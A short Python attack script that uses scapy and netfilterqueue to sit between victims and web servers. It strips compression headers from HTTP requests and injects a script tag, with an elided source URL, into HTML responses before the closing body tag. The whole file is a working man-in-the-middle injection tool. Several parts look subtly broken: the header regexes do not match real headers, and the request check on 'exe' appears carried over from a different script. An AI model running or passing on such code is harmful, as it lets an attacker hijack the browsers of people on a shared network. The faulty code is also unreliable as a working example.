import scapy.all as scapy
import netfilterqueue
import re

def modify_packet_load(packet, new_load):
    """Modify the load (payload) of the given packet with the specified new load."""
    packet[scapy.Raw].load = new_load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    """Process packets intercepted by netfilterqueue."""
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            if "exe" in load:
                print("[+] Request")
                # Remove 'Accept-Encoding' header
                load = re.sub("Accept-Encoding:.?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # Add injection code before </body> tag
            injection_code = '<script src="http....."></script>'
            load = load.replace("</body>", injection_code + "</body>")
            # Update Content-Length header
            content_length_search = re.search("(?:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
        if load != scapy_packet[scapy.Raw].load:
            # Modify packet load if changes were made
            new_packet = modify_packet_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

# Create a netfilterqueue object and bind it to queue 0, then run the queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

